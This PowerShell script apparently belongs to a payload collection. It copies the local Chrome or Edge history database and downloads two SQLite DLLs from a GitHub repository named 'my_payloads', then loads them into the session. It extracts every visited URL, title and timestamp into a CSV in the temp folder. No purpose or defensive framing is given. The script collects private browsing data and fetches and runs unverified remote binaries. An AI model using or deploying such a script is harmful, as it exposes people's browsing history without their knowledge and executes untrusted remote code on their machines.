# Define paths to browser history databases
$ChromeHistoryDB = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History"
$EdgeHistoryDB = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\History"

# Temporary copy (browsers lock original DB)
$TempDB = "$env:TEMP\BrowserHistory.db"

# Copy Chrome or Edge history file (whichever exists)
if (Test-Path $ChromeHistoryDB) {
    Copy-Item -Path $ChromeHistoryDB -Destination $TempDB -Force
    $Browser = "Google Chrome"
} elseif (Test-Path $EdgeHistoryDB) {
    Copy-Item -Path $EdgeHistoryDB -Destination $TempDB -Force
    $Browser = "Microsoft Edge"
} else {
    Write-Output "No browser history database found!"
    exit
}

# Define path to SQLite DLL
$SQLiteDllPath = "$env:TEMP\System.Data.SQLite.dll"
$SQLiteInteropPath = "$env:TEMP\SQLite.Interop.dll"

# Download SQLite DLL if not already present
if (-not (Test-Path $SQLiteDllPath -PathType Leaf)) {
    Write-Output "Downloading System.Data.SQLite..."
    Invoke-WebRequest -Uri "https://github.com/Soumyo001/my_payloads/raw/refs/heads/main/assets/System.Data.SQLite.dll" -outfile $SQLiteDllPath
}

if (-not (Test-Path $SQLiteInteropPath -PathType Leaf)) {
    Write-Output "Downloading SQLite.Interop.dll..."
    Invoke-WebRequest -Uri "https://github.com/Soumyo001/my_payloads/raw/refs/heads/main/assets/SQLite.Interop.dll" -outfile $SQLiteInteropPath
}

# Load SQLite Assembly
Add-Type -Path $SQLiteDllPath

# Query SQLite database for browsing history
$Query = "SELECT url, title, datetime(last_visit_time/1000000-11644473600, 'unixepoch', 'localtime') AS last_visited FROM urls ORDER BY last_visit_time DESC"

# Execute the query
$Connection = New-Object System.Data.SQLite.SQLiteConnection "Data Source=$TempDB;Version=3;"
$Connection.Open()

$Command = $Connection.CreateCommand()
$Command.CommandText = $Query

$Reader = $Command.ExecuteReader()
$History = @()

while ($Reader.Read()) {
    $History += [PSCustomObject]@{
        URL         = $Reader["url"]
        Title       = $Reader["title"]
        LastVisited = $Reader["last_visited"]
    }
}

$Reader.Close()
$Connection.Close()

# Display extracted history
Write-Output "Browsing History from ${Browser}:"
$History | Format-Table -AutoSize
$History | Export-Csv -Path "$env:TEMP\BrowserHistory.csv" -NoTypeInformation


# Clean up temp files
Remove-Item -Path $TempDB -Force
